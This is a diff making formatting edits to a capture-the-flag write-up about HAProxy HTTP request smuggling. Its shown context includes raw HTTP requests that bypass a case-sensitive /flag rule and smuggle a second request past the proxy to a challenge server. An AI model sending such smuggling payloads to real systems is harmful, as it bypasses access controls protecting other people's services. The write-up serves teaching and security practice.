@@ -4,11 +4,9 @@ description: HAProxy HTTP Request Smuggling
 
 # StrUggLe
 
-> Welcome to Web! I struggle everyday I face a new website, can you access /flag endpoint ?\
+> Welcome to Web! I struggle everyday I face a new website, can you access /flag endpoint ?\\
 >
->
-> Link: http://128.199.3.34:1235\
->
+> Link: http://128.199.3.34:1235\\
 >
 > **Author:** Kahla
 
@@ -19,7 +17,6 @@ The HAProxy configuration to protect the `/flag` endpoint was case sensitive. Th
 ```http
 GET /FLAG HTTP/1.1
 Host: 128.199.3.34:1235
-
 
 ```
 
@@ -51,7 +48,6 @@ GET /flag HTTP/1.1
 DUMMY:GET / HTTP/1.1
 Host: 128.199.3.34:1235
 
-
 ```
 
 In the above example, HAProxy considers the following to be the first request:
@@ -71,7 +67,6 @@ while the second request is the following:
 GET / HTTP/1.1
 Host: 128.199.3.34:1235
 
-
 ```
 
 However, when forwarded to the backend, this becomes:
@@ -84,7 +79,6 @@ Content-Length: 0
 GET /flag HTTP/1.1
 DUMMY:GET / HTTP/1.1
 Host: 128.199.3.34:1235
-
 
 ```
 
